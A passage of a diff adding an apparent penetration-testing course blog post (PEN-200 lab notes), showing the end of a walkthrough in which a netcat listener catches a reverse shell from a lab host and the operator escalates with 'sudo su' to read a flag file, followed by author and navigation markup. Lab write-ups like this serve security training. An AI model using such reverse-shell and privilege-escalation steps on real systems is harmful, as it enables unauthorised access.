+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
+connect to [192.168.45.223] from (UNKNOWN) [192.168.220.16] 50532
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+stanley@c95818fc2884:/app$ sudo su
+sudo su
+cat /opt/config.txt
+OS{f421330abb4760d03c21d838884fbfa2}
+&lt;/code&gt;&lt;/pre&gt;
+
+  &lt;/div&gt;
+
+  
+    &lt;footer class=&quot;blog-author-card&quot;&gt;
+      
+        &lt;img class=&quot;blog-author-avatar&quot; src=&quot;assets/static/img/bunny-punx.webp&quot; alt=&quot;m4xx3d0ut avatar&quot;&gt;
+      
+      &lt;div class=&quot;blog-author-details&quot;&gt;
+        &lt;strong class=&quot;blog-author-name&quot;&gt;m4xx3d0ut&lt;/strong&gt;
+        
+          &lt;div class=&quot;blog-author-title&quot;&gt;Chaos Operator&lt;/div&gt;
+        
+        
+          &lt;p class=&quot;blog-author-bio&quot;&gt;Architect of the Neon Terminal Core and Professional Technologist.&lt;/p&gt;
+        
+        
+          &lt;ul class=&quot;blog-author-social&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/paul-k-a3a18196/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@m4xx3d0ut&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        
+      &lt;/div&gt;
+    &lt;/footer&gt;
+  
+
+  
+    &lt;nav class=&quot;blog-article-nav&quot; aria-label=&quot;Post navigation&quot;&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;previous&quot;
+        
+        href=&quot;blog/sql-injection.html&quot;
+        data-default-href=&quot;blog/sql-injection.html&quot;
+        data-default-fragment=&quot;blog/fragments/sql-injection.html&quot;
+        data-fragment-href=&quot;blog/fragments/sql-injection.html&quot;
+        data-target-slug=&quot;sql-injection&quot;
+        data-post-slug=&quot;sql-injection&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Previous&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 10 — SQL Injection Field Notes&lt;/span&gt;
+      &lt;/a&gt;
+      &lt;span class=&quot;blog-article-nav-delimiter&quot; aria-hidden=&quot;true&quot;&gt;&amp;nbsp;•&amp;nbsp;&lt;/span&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;next&quot;
+        
+        href=&quot;blog/web-intro.html&quot;
+        data-default-href=&quot;blog/web-intro.html&quot;
+        data-default-fragment=&quot;blog/fragments/web-intro.html&quot;
+        data-fragment-href=&quot;blog/fragments/web-intro.html&quot;
+        data-target-slug=&quot;web-intro&quot;
+        data-post-slug=&quot;web-intro&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Next&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 8 — Web App Recon to First Exploit&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/nav&gt;
+  
+&lt;/article&gt;
+
+</code></pre>
+      </div>
+    </article>
+  
